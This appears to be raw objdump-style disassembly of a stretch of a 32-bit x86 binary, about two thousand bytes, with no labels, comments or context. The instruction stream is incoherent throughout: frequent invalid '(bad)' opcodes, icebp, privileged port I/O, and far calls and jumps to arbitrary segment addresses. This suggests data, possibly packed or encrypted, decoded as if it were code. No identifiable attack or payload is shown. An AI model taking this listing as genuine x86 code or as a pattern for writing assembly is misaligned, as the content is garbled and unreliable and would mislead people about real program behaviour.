  40a6f2:	sub    edi,ecx
  40a6f4:	pop    ds
  40a6f5:	jo     0x40a770
  40a6f7:	(bad)  
  40a6f8:	mov    ds:0x8a0d6c20,eax
  40a6fd:	(bad)  
  40a6fe:	pushf  
  40a6ff:	push   edx
  40a700:	call   0xf8032026
  40a705:	shld   eax,edx,cl
  40a708:	loope  0x40a6a8
  40a70a:	nop
  40a70b:	test   eax,0x8890071f
  40a710:	outs   dx,BYTE PTR ds:[esi]
  40a711:	out    0xa6,al
  40a713:	aas    
  40a714:	or     al,0xe6
  40a716:	imul   eax,edx,0xffffffe1
  40a719:	loopne 0x40a783
  40a71b:	sbb    BYTE PTR cs:[edx-0x311e2c7f],ch
  40a722:	nop
  40a723:	test   eax,0x5d98cfe8
  40a728:	or     eax,0x8823627a
  40a72d:	push   esp
  40a72e:	xchg   esi,eax
  40a72f:	test   eax,0x8d270ed8
  40a734:	call   0x6c45:0xd9d1b90f
  40a73b:	leave  
  40a73c:	test   DWORD PTR [ebp+0x7e],0xd1f7b1d6
  40a743:	(bad)  
  40a744:	(bad)  
  40a746:	add    DWORD PTR [eax],eax
  40a748:	sbb    dh,ah
  40a74a:	xchg   ecx,eax
  40a74b:	or     BYTE PTR ds:0xad393c46,0x98
  40a752:	(bad)  
  40a753:	jg     0x40a719
  40a755:	out    dx,al
  40a756:	outs   dx,BYTE PTR ds:[esi]
  40a757:	mov    DWORD PTR [eax+esi*8],esp
  40a75a:	repnz out dx,al
  40a75c:	push   cs
  40a75d:	xchg   DWORD PTR [ebx-0x47],esp
  40a760:	test   DWORD PTR [edi],0xe67628c1
  40a766:	xchg   ecx,eax
  40a768:	or     eax,0xf7396d96
  40a76d:	ud1    ebp,DWORD PTR [eax]
  40a770:	or     eax,0x9454900a
  40a775:	clc    
  40a776:	xchg   esi,eax
  40a777:	aas    
  40a778:	sbb    DWORD PTR [edx-0x7f],edx
  40a77b:	cli    
  40a77c:	inc    edi
  40a77d:	stos   BYTE PTR es:[edi],al
  40a77e:	push   ebp
  40a77f:	out    dx,al
  40a780:	push   edx
  40a781:	cmp    eax,0x1857e4dc
  40a786:	aam    0x28
  40a788:	cmc    
  40a789:	out    dx,eax
  40a78a:	xchg   esi,eax
  40a78b:	arpl   WORD PTR [ecx],cx
  40a78d:	fadd   DWORD PTR [esi-0x8182ad7]
  40a793:	in     eax,dx
  40a794:	or     eax,0xf7390df6
  40a799:	ud1    ebp,DWORD PTR [eax]
  40a79c:	inc    eax
  40a79d:	icebp  
  40a79e:	sub    BYTE PTR [edi],0x7d
  40a7a1:	adc    BYTE PTR [edi+0x63e71f29],al
  40a7a7:	mov    ebp,0x28010ff7
  40a7ac:	cmc    
  40a7ad:	sbb    eax,DWORD PTR [eax+0x38]
  40a7b0:	icebp  
  40a7b1:	pop    es
  40a7b2:	xchg   edi,eax
  40a7b3:	stc    
  40a7b4:	shl    DWORD PTR [edx+0xff7d679],0xd9
  40a7bb:	sub    DWORD PTR [eax],edx
  40a7bd:	out    0x91,al
  40a7bf:	test   al,0x1d
  40a7c1:	popa   
  40a7c2:	push   es
  40a7c3:	xor    DWORD PTR [edx+0x383fb6e0],esp
  40a7c9:	sbb    ah,dh
  40a7cb:	mov    DWORD PTR [eax],ecx
  40a7cd:	adc    BYTE PTR [edi+edi*1+0x191718e1],0x1d
  40a7d5:	addr16 push eax
  40a7d7:	jbe    0x40a76a
  40a7d9:	loopne 0x40a7b1
  40a7db:	das    
  40a7dc:	xor    dl,ah
  40a7de:	xchg   ebp,eax
  40a7df:	mov    eax,0x211c7185
  40a7e4:	test   DWORD PTR [edi],0x77e62bb9
  40a7ea:	xchg   ch,ah
  40a7ec:	aaa    
  40a7ed:	sbb    ch,BYTE PTR [edx-0x772f7cd7]
  40a7f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a7f4:	test   DWORD PTR [edi],0xc8405679
  40a7fa:	or     BYTE PTR [eax+0x56790ff7],ah
  40a800:	(bad)  
  40a801:	stc    
  40a802:	inc    esp
  40a803:	mov    ebx,0xfd862008
  40a808:	sub    BYTE PTR [edx+0x21e8061e],bh
  40a80e:	jns    0x40a7d2
  40a810:	test   DWORD PTR [edi],0xd0bbde8d
  40a816:	sbb    eax,0xf6f4c359
  40a81b:	das    
  40a81c:	jmp    0x8c7c372f
  40a821:	rol    DWORD PTR [ebp-0x7b2473a8],cl
  40a827:	test   eax,0x3800ec09
  40a82c:	xor    eax,0x6f359784
  40a831:	jecxz  0x40a8b1
  40a833:	sub    esp,DWORD PTR [edi+0x1b]
  40a836:	sbb    eax,0x1e581c6a
  40a83b:	sub    esi,ebp
  40a83d:	mov    al,0x56
  40a83f:	sti    
  40a840:	jmp    0x40a870
  40a842:	adc    bx,cx
  40a845:	sub    cl,BYTE PTR [eax-0x49]
  40a848:	adc    al,0x2d
  40a84a:	call   0xb617:0xfb6ee0ef
  40a851:	int3   
  40a852:	inc    ebx
  40a853:	jecxz  0x40a8bd
  40a855:	and    ch,BYTE PTR [edi+edx*2-0x6a]
  40a859:	push   esi
  40a85a:	mov    ah,BYTE PTR [ecx-0xd81d1fa]
  40a860:	push   esp
  40a861:	jmp    0x3da3:0xc04fe34e
  40a868:	xchg   esi,eax
  40a869:	cmc    
  40a86a:	push   cs
  40a86b:	fnsave [esp+ebp*4-0x55]
  40a86f:	xor    eax,0x9376f969
  40a874:	(bad)  
  40a875:	cmp    al,0xcd
  40a877:	dec    edi
  40a878:	pop    es
  40a879:	push   esp
  40a87a:	das    
  40a87b:	ins    DWORD PTR es:[edi],dx
  40a87c:	add    al,0x9
  40a87e:	jbe    0x40a8d6
  40a880:	and    dl,BYTE PTR [edx+0x20]
  40a883:	mov    al,ds:0x9907e07f
  40a888:	fld    DWORD PTR [esi]
  40a88a:	jmp    0x9767e414
  40a88f:	cmp    DWORD PTR [edi+0x2],ebp
  40a892:	mul    BYTE PTR [edi+0x56]
  40a895:	out    dx,eax
  40a896:	add    BYTE PTR [edx-0x5259daeb],bh
  40a89c:	push   edi
  40a89d:	into   
  40a89e:	xchg   ebx,eax
  40a89f:	dec    eax
  40a8a0:	stc    
  40a8a1:	loopne 0x40a8cb
  40a8a3:	add    cl,BYTE PTR [ebx-0x72]
  40a8a6:	cli    
  40a8a7:	in     eax,dx
  40a8a8:	mov    edx,DWORD PTR [ebp-0x5a]
  40a8ab:	loop   0x40a885
  40a8ad:	js     0x40a903
  40a8af:	out    dx,eax
  40a8b0:	nop
  40a8b1:	rol    DWORD PTR [esi-0x3],1
  40a8b4:	sub    al,0x68
  40a8b6:	mov    es:0x2b843c1b,eax
  40a8bc:	xchg   esi,eax
  40a8bd:	inc    eax
  40a8be:	sbb    dh,BYTE PTR [ebx-0x16510a37]
  40a8c4:	sbb    eax,0xcb2bf494
  40a8c9:	popa   
  40a8ca:	xchg   edx,eax
  40a8cb:	or     eax,0x21bba004
  40a8d0:	jb     0x40a93f
  40a8d2:	scas   eax,DWORD PTR es:[edi]
  40a8d3:	scas   eax,DWORD PTR es:[edi]
  40a8d4:	sub    DWORD PTR [eax-0x1678f670],edi
  40a8da:	mov    WORD PTR [ebp+0x13],fs
  40a8dd:	pop    edx
  40a8de:	scas   al,BYTE PTR es:[edi]
  40a8df:	sub    eax,0xad9ce121
  40a8e4:	xchg   eax,ebp
  40a8e6:	inc    esi
  40a8e7:	dec    eax
  40a8e8:	sbb    eax,0x77a72d0c
  40a8ed:	and    BYTE PTR [esi],bh
  40a8ef:	push   edi
  40a8f0:	js     0x40a912
  40a8f2:	test   BYTE PTR [esi-0x4c6911e9],cl
  40a8f8:	nop
  40a8f9:	xor    BYTE PTR [esi+0x34ed1af0],al
  40a8ff:	or     eax,DWORD PTR [ecx]
  40a901:	pop    edx
  40a902:	push   es
  40a903:	ds dec ecx
  40a905:	xchg   edi,eax
  40a906:	clc    
  40a907:	ja     0x40a941
  40a909:	cli    
  40a90a:	(bad)  
  40a90b:	test   eax,0x2bf2ad37
  40a910:	out    dx,al
  40a911:	add    BYTE PTR [esi-0x1d],ch
  40a914:	push   edi
  40a915:	out    0x44,eax
  40a917:	or     al,ah
  40a919:	push   esi
  40a91a:	or     ebp,DWORD PTR ss:[eax+0x6b598ed0]
  40a921:	pop    eax
  40a922:	add    BYTE PTR [ecx+0x49],ah
  40a925:	rcl    BYTE PTR [ebx-0x6fe9141f],1
  40a92b:	jne    0x40a977
  40a92d:	jmp    0x40a97d
  40a92f:	out    dx,al
  40a930:	inc    eax
  40a931:	jae    0x40a97a
  40a933:	(bad)  
  40a936:	and    cl,BYTE PTR [ebx]
  40a938:	pop    eax
  40a939:	clc    
  40a93a:	mov    al,0xad
  40a93c:	(bad)  
  40a93d:	ss dec esp
  40a93f:	icebp  
  40a940:	das    
  40a941:	cwde   
  40a942:	mov    ch,0x0
  40a944:	jg     0x40a8df
  40a946:	ret    
  40a947:	cmp    DWORD PTR [eax+0x5bf5d7fa],ecx
  40a94d:	sub    DWORD PTR [ebp-0x2e976bd5],ebp
  40a953:	mov    eax,0x77ce31fb
  40a958:	mov    esp,0x966dd219
  40a95d:	xchg   esi,eax
  40a95e:	xchg   BYTE PTR [ebx+0x7d],dl
  40a961:	mov    ah,BYTE PTR [edx+0x59d5617f]
  40a967:	sub    BYTE PTR [edx+0x74bb8b12],bh
  40a96d:	(bad)  
  40a96e:	ds dec esi
  40a970:	fiadd  DWORD PTR [ecx+0x9]
  40a973:	sub    edx,ebp
  40a975:	je     0x40a908
  40a977:	lods   al,BYTE PTR ds:[esi]
  40a978:	xchg   ebp,eax
  40a979:	fidiv  WORD PTR [ebx+0x28]
  40a97c:	mov    eax,ds:0x8973a71
  40a981:	ss inc ecx
  40a983:	repz inc ebx
  40a985:	jbe    0x40a977
  40a987:	mov    cl,BYTE PTR [eax]
  40a989:	call   DWORD PTR [ecx+edi*1-0x2c577db7]
  40a990:	or     al,0x68
  40a992:	test   BYTE PTR [ecx],0x9
  40a995:	enter  0x9909,0x74
  40a999:	xchg   esi,eax
  40a99a:	sub    DWORD PTR [esi-0x3f9501c5],esi
  40a9a0:	jmp    0x58d1:0xc7b5a855
  40a9a7:	mov    DWORD PTR [edi],ecx
  40a9a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9aa:	mov    ecx,0xf26702c8
  40a9af:	jae    0x40a987
  40a9b1:	cmp    eax,0x4925487f
  40a9b6:	lds    ebp,FWORD PTR [ecx]
  40a9b8:	inc    esi
  40a9b9:	push   esp
  40a9ba:	inc    esp
  40a9bb:	push   ds
  40a9bc:	test   DWORD PTR [edi-0x7530de14],0xf678646d
  40a9c6:	pop    eax
  40a9c7:	shl    al,cl
  40a9c9:	or     DWORD PTR [edi+eax*2],ebp
  40a9cc:	pop    es
  40a9cd:	(bad)  [ecx+ebx*1]
  40a9d0:	or     ah,ah
  40a9d2:	dec    ebp
  40a9d3:	ins    DWORD PTR es:[edi],dx
  40a9d4:	sub    edi,DWORD PTR [ecx]
  40a9d6:	iret   
  40a9d7:	outs   dx,DWORD PTR ds:[esi]
  40a9d8:	dec    ah
  40a9da:	mov    al,0xec
  40a9dc:	daa    
  40a9dd:	icebp  
  40a9de:	mov    ch,0xef
  40a9e0:	pop    esi
  40a9e1:	adc    eax,0x3c08092d
  40a9e6:	mov    esp,0xcbf934cc
  40a9eb:	test   DWORD PTR [edx],ebx
  40a9ed:	icebp  
  40a9ee:	lods   al,BYTE PTR ds:[esi]
  40a9ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9f0:	jne    0x40a9a2
  40a9f2:	je     0x40aa34
  40a9f4:	push   eax
  40a9f5:	(bad)  
  40a9f6:	mov    dl,0xc4
  40a9f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a9f9:	fwait
  40a9fa:	xchg   bh,cl
  40a9fc:	xor    DWORD PTR [edx+ebx*8+0x7164a71d],0x36
  40aa04:	or     DWORD PTR [ebp-0x665c49eb],esp
  40aa0a:	sbb    dh,al
  40aa0c:	loopne 0x40aa80
  40aa0e:	xchg   DWORD PTR [ecx+0x53bca78f],edx
  40aa14:	(bad)  
  40aa15:	cwde   
  40aa16:	aad    0x28
  40aa18:	sbb    BYTE PTR [ebx+0x57],bh
  40aa1b:	xor    dh,bh
  40aa1d:	daa    
  40aa1e:	sub    BYTE PTR [esi+0x58],ch
  40aa21:	inc    ebx
  40aa22:	out    0x67,al
  40aa24:	das    
  40aa25:	repz shl dh,0xb6
  40aa29:	(bad)  
  40aa2a:	pop    esp
  40aa2b:	dec    eax
  40aa2c:	mov    cl,0x11
  40aa2e:	xchg   ecx,eax
  40aa2f:	jle    0x40aa39
  40aa31:	bound  esi,QWORD PTR ds:0x26f32ac6
  40aa37:	pop    ebp
  40aa38:	dec    eax
  40aa39:	icebp  
  40aa3a:	push   ss
  40aa3b:	out    dx,al
  40aa3c:	fst    QWORD PTR [edi+ecx*4]
  40aa3f:	xor    dl,ch
  40aa41:	sbb    BYTE PTR [ebp-0x47602193],cl
  40aa47:	sbb    eax,0x9b07228b
  40aa4c:	xchg   ecx,eax
  40aa4d:	icebp  
  40aa4e:	xchg   esi,eax
  40aa4f:	clc    
  40aa50:	imul   esp
  40aa52:	fist   WORD PTR [esi]
  40aa54:	pop    ecx
  40aa55:	cld    
  40aa56:	mov    bh,0xe4
  40aa58:	jae    0x40aad6
  40aa5a:	xchg   BYTE PTR [ecx-0x4a9a4083],dl
  40aa60:	pop    edi
  40aa61:	gs push ecx
  40aa63:	push   ebp
  40aa64:	mov    ch,0x91
  40aa66:	test   BYTE PTR [edx-0x71],dh
  40aa69:	cmp    DWORD PTR [edi],ebp
  40aa6b:	bound  ecx,QWORD PTR [eax]
  40aa6d:	or     al,0x5b
  40aa6f:	sbb    al,0x55
  40aa71:	xlat   BYTE PTR ds:[ebx]
  40aa72:	pop    eax
  40aa73:	inc    edx
  40aa74:	or     eax,0x74fd84f6
  40aa79:	jne    0x40aa82
  40aa7b:	bound  ecx,QWORD PTR [eax]
  40aa7d:	gs dec ebp
  40aa7f:	push   0xb1d28df1
  40aa84:	call   0xd02a:0x66c78744
  40aa8b:	mov    dl,0x73
  40aa8d:	push   edi
  40aa8e:	stc    
  40aa8f:	sub    BYTE PTR [edx+0x9023a31],ah
  40aa95:	loop   0x40aa1c
  40aa97:	fld    TBYTE PTR [ecx+0x23]
  40aa9a:	add    al,0xa8
  40aa9c:	shl    al,0xcc
  40aa9f:	mov    al,0xb2
  40aaa1:	loope  0x40aad5
  40aaa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aaa4:	int    0xfc
  40aaa6:	sub    al,ch
  40aaa8:	mov    al,0xd1
  40aaaa:	xchg   edi,ecx
  40aaac:	in     eax,dx
  40aaad:	adc    ecx,DWORD PTR [edi]
  40aaaf:	out    dx,eax
  40aab0:	scas   eax,DWORD PTR es:[edi]
  40aab1:	sbb    al,0x5e
  40aab3:	sub    BYTE PTR [edx+0x51],ch
  40aab6:	sbb    eax,0x68dbf750
  40aabb:	or     DWORD PTR [ecx+0x31],edi
  40aabe:	popf   
  40aabf:	mov    ds,WORD PTR [esi-0x20ec1112]
  40aac5:	lods   eax,DWORD PTR ds:[esi]
  40aac6:	shrd   esp,ecx,cl
  40aac9:	aaa    
  40aaca:	pop    es
  40aacb:	ret    0x4cef
  40aace:	aaa    
  40aacf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aad0:	adc    DWORD PTR [edi-0x25],eax
  40aad3:	ja     0x40ab27
  40aad5:	inc    ecx
  40aad6:	std    
  40aad7:	sub    DWORD PTR [eax-0x20e34988],esp
  40aadd:	sbb    DWORD PTR [edx+0x16],ecx
  40aae0:	inc    esi
  40aae1:	and    BYTE PTR [eax+0x15e7a8a8],bl
  40aae7:	pop    ds
  40aae8:	clc    
  40aae9:	popf   
  40aaea:	test   DWORD PTR [edi+0x53764475],esi
  40aaf0:	(bad)  
  40aaf1:	dec    BYTE PTR [esi+0x68]
  40aaf4:	lods   eax,DWORD PTR ds:[esi]
  40aaf5:	or     dl,BYTE PTR [esi-0xc]
  40aaf8:	stos   BYTE PTR es:[edi],al
  40aaf9:	sbb    BYTE PTR [edx+0x434b3fab],cl
  40aaff:	enter  0x2b31,0x85
  40ab03:	add    DWORD PTR [esi-0x118b9cf6],edx
  40ab09:	push   ecx
  40ab0a:	xchg   BYTE PTR [eax],dl
  40ab0c:	shl    DWORD PTR [edi-0x19],0x9b
  40ab10:	ffreep st(3)
  40ab12:	xchg   DWORD PTR [edi-0x1],esi
  40ab15:	pop    eax
  40ab16:	jns    0x40aafc
  40ab18:	or     eax,0xaa28f674
  40ab1d:	arpl   WORD PTR [edx],dx
  40ab1f:	aam    0x14
  40ab21:	jle    0x40ab24
  40ab23:	and    BYTE PTR [edi],al
  40ab25:	mov    bl,0xa3
  40ab27:	mov    dl,0xc0
  40ab29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab2a:	mov    ch,0x91
  40ab2c:	pop    ecx
  40ab2d:	movlhps xmm1,xmm2
  40ab30:	repz mul bl
  40ab33:	cs or  eax,0xcfc7a4b
  40ab39:	mov    eax,0x1ae264c7
  40ab3e:	ficomp WORD PTR [ecx-0x7c47a1f7]
  40ab44:	xor    ebx,DWORD PTR [eax+ecx*2]
  40ab47:	pop    ds
  40ab48:	mov    ch,0x4
  40ab4a:	out    dx,al
  40ab4b:	sub    BYTE PTR [ebx+eiz*4-0xdf68ec4],dh
  40ab52:	inc    BYTE PTR [esi-0x7a0b8e2b]
  40ab58:	and    ah,ch
  40ab5a:	mov    al,0xf7
  40ab5c:	push   ecx
  40ab5d:	pop    esp
  40ab5e:	cs aam 0x13
  40ab61:	loopne 0x40aba9
  40ab63:	inc    edi
  40ab64:	or     BYTE PTR [eax],al
  40ab66:	mov    edx,0xcecc0c1c
  40ab6b:	sub    DWORD PTR [ecx],eax
  40ab6d:	icebp  
  40ab6e:	sbb    al,BYTE PTR [edi+edi*4-0x6a7c525c]
  40ab75:	(bad)  
  40ab76:	call   0xf7328788
  40ab7b:	fnsave [ecx-0x528ff24a]
  40ab81:	(bad)  
  40ab82:	mov    edx,0xa885a867
  40ab87:	shr    ch,1
  40ab89:	aaa    
  40ab8a:	jns    0x40ab35
  40ab8c:	fdiv   QWORD PTR [ebx+0x440902e0]
  40ab92:	jae    0x40ab5c
  40ab94:	retf   
  40ab95:	xor    DWORD PTR [eax+0x788db7f2],edx
  40ab9b:	test   BYTE PTR [esi],dh
  40ab9d:	or     BYTE PTR [ebp+0x7c84cb51],0x29
  40aba4:	jnp    0x40ab81
  40aba6:	out    dx,eax
  40aba7:	cmp    ebp,DWORD PTR [esi-0x58bc461b]
  40abad:	sub    eax,DWORD PTR [esi]
  40abaf:	call   0x8e8f:0x9fb0f1dc
  40abb6:	cdq    
  40abb7:	loope  0x40ab82
  40abb9:	ror    ebp,cl
  40abbb:	xchg   ecx,eax
  40abbc:	cdq    
  40abbd:	jno    0x40ab45
  40abbf:	scas   eax,DWORD PTR es:[edi]
  40abc0:	mov    DWORD PTR [edi],edx
  40abc2:	add    al,0x8f
  40abc4:	xor    al,0xf0
  40abc6:	sbb    DWORD PTR ds:[ecx+ecx*1-0x2b],ebx
  40abcb:	pop    esp
  40abcc:	and    ecx,DWORD PTR [ebp+0x71]
  40abcf:	push   0x8
  40abd1:	test   BYTE PTR [edi-0x3a],0xd9
  40abd5:	jnp    0x40aba5
  40abd7:	cmp    ebp,DWORD PTR [esi-0xf]
  40abda:	shl    BYTE PTR [ebp+0x32],1
  40abdd:	mov    edi,0x80d75eb6
  40abe2:	test   eax,0x873aefb2
  40abe7:	iret   
  40abe8:	call   0xcfe50041
  40abed:	inc    edx
  40abee:	imul   ebp,DWORD PTR [eax],0xffffff8d
  40abf1:	stos   DWORD PTR es:[edi],eax
  40abf2:	outs   dx,BYTE PTR ds:[esi]
  40abf3:	dec    ebp
  40abf4:	(bad)  
  40abf5:	xlat   BYTE PTR ds:[ebx]
  40abf6:	inc    edi
  40abf7:	mov    ch,0xf1
  40abf9:	add    DWORD PTR [ecx-0xcc902d],0x2
  40ac00:	mov    DWORD PTR [edx-0xf976545],esp
  40ac06:	adc    bh,ch
  40ac08:	cwde   
  40ac09:	xchg   edx,eax
  40ac0a:	arpl   WORD PTR [ecx+0x22ed72ce],si
  40ac10:	mov    edx,ebx
  40ac12:	test   DWORD PTR [ecx-0x3f],esi
  40ac15:	mov    dl,0x51
  40ac17:	aaa    
  40ac18:	mov    al,0x18
  40ac1a:	pop    ss
  40ac1b:	mov    al,ds:0xd706f0e6
  40ac20:	dec    eax
  40ac21:	dec    esp
  40ac22:	icebp  
  40ac23:	daa    
  40ac24:	push   ebp
  40ac25:	shl    esi,0xac
  40ac28:	rcr    BYTE PTR [eax-0x77],1
  40ac2b:	imul   ecx,DWORD PTR [esi],0xe4de5aaf
  40ac31:	loope  0x40ac9f
  40ac33:	dec    ecx
  40ac34:	loope  0x40ac1d
  40ac36:	xor    dh,BYTE PTR [edi]
  40ac38:	dec    edi
  40ac39:	xlat   BYTE PTR ds:[ebx]
  40ac3a:	loopne 0x40ac05
  40ac3c:	js     0x40ac31
  40ac3e:	adc    dh,BYTE PTR [edx+0x8]
  40ac41:	add    BYTE PTR [esi+0x7d],0xc5
  40ac45:	stc    
  40ac46:	xchg   edx,eax
  40ac47:	addr16 dec esi
  40ac49:	icebp  
  40ac4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac4b:	aas    
  40ac4c:	jbe    0x40accb
  40ac4e:	xor    al,BYTE PTR [ebp+0x64a76361]
  40ac54:	clc    
  40ac55:	and    DWORD PTR [ecx+0x5d60b019],eax
  40ac5b:	adc    ebp,DWORD PTR [ebp+edx*1-0x55da2900]
  40ac62:	push   ebx
  40ac63:	sub    eax,ebp
  40ac65:	push   ecx
  40ac66:	add    ebx,edx
  40ac68:	mul    ebx
  40ac6a:	shl    BYTE PTR [esi-0x29],1
  40ac6d:	cld    
  40ac6e:	gs shl ebp,0xf2
  40ac72:	out    0x1f,al
  40ac74:	rol    DWORD PTR [eax+0x41e5fb16],cl
  40ac7a:	fmul   DWORD PTR [bx]
  40ac7d:	and    BYTE PTR [esi],ch
  40ac7f:	icebp  
  40ac80:	retf   0x79a3
  40ac83:	call   0x1a180dfe
  40ac88:	test   eax,0xb426fe0b
  40ac8d:	mov    al,0x68
  40ac8f:	out    0xea,al
  40ac91:	out    dx,eax
  40ac92:	js     0x40aca1
  40ac94:	xchg   edx,eax
  40ac95:	mov    al,BYTE PTR [edi-0x5e9daddd]
  40ac9b:	inc    esi
  40ac9c:	jns    0x40ac39
  40ac9e:	jne    0x40acc6
  40aca0:	or     edi,ecx
  40aca2:	sub    DWORD PTR [eax-0xd],edi
  40aca5:	imul   eax,DWORD PTR [esi+0x66],0xee94ae09
  40acac:	out    0x22,eax
  40acae:	add    eax,0x1cf80d2b
  40acb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40acb4:	mov    ecx,DWORD PTR [edx-0x51]
  40acb7:	jp     0x40ac62
  40acb9:	and    dh,bl
  40acbb:	test   eax,0x8188208
  40acc0:	mov    eax,ds:0xd7f4dc26
  40acc5:	icebp  
  40acc6:	push   esp
  40acc7:	inc    ebp
  40acc8:	pushf  
  40acc9:	adc    al,0xb4
  40accb:	cdq    
  40accc:	push   ss
  40accd:	push   es
  40acce:	pop    eax
  40accf:	arpl   bx,di
  40acd1:	and    eax,DWORD PTR [ebp+0x63f81d95]
  40acd7:	xor    al,0x1d
  40acd9:	icebp  
  40acda:	inc    esi
  40acdb:	imul   ebx,ecx,0xffffffbc
  40acde:	ins    BYTE PTR es:[edi],dx
  40acdf:	mov    DWORD PTR [esi+0x5fc92851],esp
  40ace5:	sahf   
  40ace6:	xchg   DWORD PTR [ecx-0x62],ebx
  40ace9:	dec    ebp
  40acea:	in     eax,0xb4
  40acec:	push   0x22c2b2f1
  40acf1:	iret   
  40acf2:	jb     0x40acd8
  40acf4:	push   ss
  40acf5:	into   
  40acf6:	(bad)  
  40acf7:	jecxz  0x40ad38
  40acf9:	icebp  
  40acfa:	cld    
  40acfb:	stos   DWORD PTR es:[edi],eax
  40acfc:	sbb    eax,0x34a649c0
  40ad01:	icebp  
  40ad02:	or     al,0x4f
  40ad04:	sar    cl,cl
  40ad06:	push   ecx
  40ad07:	lock jbe 0x40ad22
  40ad0a:	push   0xffffff86
  40ad0c:	sbb    bl,BYTE PTR [edi-0x79]
  40ad0f:	fistp  WORD PTR [ebx+ebx*2+0x30cd42fb]
  40ad16:	(bad)  
  40ad17:	sub    eax,DWORD PTR [eax]
  40ad19:	xor    al,0xae
  40ad1b:	add    al,0x93
  40ad1d:	xor    BYTE PTR [ebp-0x5],ch
  40ad20:	or     BYTE PTR [ebx+eax*8+0x1e],bh
  40ad24:	fs lahf 
  40ad26:	not    BYTE PTR ds:0xb7bef1e6
  40ad2c:	mov    al,ds:0xbaa31a4a
  40ad31:	push   edi
  40ad32:	add    DWORD PTR [ebp-0x3c7958bf],ecx
  40ad38:	and    bl,BYTE PTR [ecx+0x11d849b2]
  40ad3e:	xchg   ebx,eax
  40ad3f:	mov    al,0x14
  40ad41:	pop    esi
  40ad42:	xchg   DWORD PTR [ebp+0x28],esp
  40ad45:	call   0xf186:0x1987b82b
  40ad4c:	and    cl,BYTE PTR [ebx]
  40ad4e:	das    
  40ad4f:	jge    0x40ad1e
  40ad51:	mov    ds:0xd2ed283f,eax
  40ad56:	mov    eax,0x7bd5f779
  40ad5b:	or     al,0x81
  40ad5d:	into   
  40ad5e:	ja     0x40ad91
  40ad60:	inc    ecx
  40ad61:	xlat   BYTE PTR ds:[ebx]
  40ad62:	retf   0x8dec
  40ad65:	in     eax,dx
  40ad66:	and    BYTE PTR [ebx],dl
  40ad68:	mov    bl,BYTE PTR [eax]
  40ad6a:	call   0x3d90f3fa
  40ad6f:	cs test ebp,0x239d5e8c
  40ad76:	(bad)  
  40ad77:	pushf  
  40ad78:	bound  edx,QWORD PTR [ebx]
  40ad7a:	pusha  
  40ad7b:	ret    0x8bd1
  40ad7e:	jge    0x40ada8
  40ad80:	out    dx,al
  40ad81:	pusha  
  40ad82:	mov    eax,ds:0xc1ec090d
  40ad87:	sbb    dh,0xb5
  40ad8a:	outs   dx,BYTE PTR ds:[esi]
  40ad8b:	add    eax,0xf9baf17c
  40ad90:	fwait
  40ad91:	push   edi
  40ad92:	xor    cl,al
  40ad94:	(bad)  
  40ad95:	jb     0x40adb1
  40ad97:	jbe    0x40ae0f
  40ad99:	mov    edi,0x57097589
  40ad9e:	xchg   ecx,eax
  40ad9f:	xlat   BYTE PTR ds:[ebx]
  40ada0:	jle    0x40ad93
  40ada2:	into   
  40ada3:	cmp    DWORD PTR [ebx-0x48],ebx
  40ada6:	xor    eax,0x9217365c
  40adac:	mov    eax,DWORD PTR [edx]
  40adae:	fwait
  40adaf:	sti    
  40adb0:	cld    
  40adb1:	ins    BYTE PTR es:[edi],dx
  40adb2:	sub    eax,0x88f1dfa8
  40adb7:	mov    edi,DWORD PTR [bx+di]
  40adba:	sbb    eax,0x27201bc9
  40adbf:	jae    0x40adca
  40adc1:	dec    esi
  40adc2:	dec    edi
  40adc3:	cld    
  40adc4:	mov    ah,dl
  40adc6:	int    0xa2
  40adc8:	icebp  
  40adc9:	icebp  
  40adca:	cwde   
  40adcb:	or     eax,0x86c6c621
  40add0:	cmp    eax,DWORD PTR [edx]
  40add2:	adc    eax,0x8649ba48
  40add7:	aad    0xe1
  40add9:	in     al,dx
  40adda:	call   0x3b336391
  40addf:	les    ebx,FWORD PTR [ecx+0x6a]
  40ade2:	or     BYTE PTR [edi+0x141518de],ch
  40ade8:	push   cs
  40ade9:	pop    esi
  40adea:	ficom  DWORD PTR [ebx]
  40adec:	push   ss
  40aded:	mov    ah,BYTE PTR [ebx+0x2fbb1fae]
  40adf3:	sub    DWORD PTR [ebx+ebx*1+0x11],ecx
  40adf7:	daa    
  40adf8:	or     ah,al
  40adfa:	mov    eax,ds:0x68be72d3
  40adff:	test   al,0xa5
  40ae01:	mov    ch,BYTE PTR [edx+0x6c]
  40ae04:	js     0x40adbd
  40ae06:	test   al,0x5
  40ae08:	mov    ch,0xf5
  40ae0a:	xchg   DWORD PTR [eax-0x6e],edx
  40ae0d:	jge    0x40ae10
  40ae0f:	(bad)  
  40ae10:	or     BYTE PTR [eax+0x2dcb6272],ch
  40ae16:	cmp    DWORD PTR [ebp+0x7a],esp
  40ae19:	in     eax,dx
  40ae1a:	xchg   esi,eax
  40ae1b:	cdq    
  40ae1c:	pop    ss
  40ae1d:	sub    esi,0x46dad5ea
  40ae23:	shl    ebp,0xfd
  40ae26:	cmc    
  40ae27:	mov    bl,0xc3
  40ae29:	xor    eax,0xd8cfaf87
  40ae2e:	add    eax,0x8276a79e
  40ae33:	es push cs
  40ae35:	xor    al,bh
  40ae37:	mov    edi,0x1e68c0b1
  40ae3c:	or     eax,ebx
  40ae3e:	inc    esi
  40ae3f:	int3   
  40ae40:	jg     0x40ae4c
  40ae42:	push   es
  40ae43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae44:	jnp    0x40ae44
  40ae46:	out    dx,al
  40ae47:	cmp    ch,BYTE PTR [ecx-0x3107efe0]
  40ae4d:	iret   
  40ae4e:	xlat   BYTE PTR ds:[ebx]
  40ae4f:	scas   al,BYTE PTR es:[edi]
  40ae50:	mov    esp,0x1628766f
  40ae55:	mov    ah,0x6e
  40ae57:	fnstsw WORD PTR [ebx+0x691c95f0]
  40ae5d:	fnstenv [eax-0x5c]
  40ae60:	jns    0x40ae52
  40ae62:	dec    esi
  40ae63:	leave  
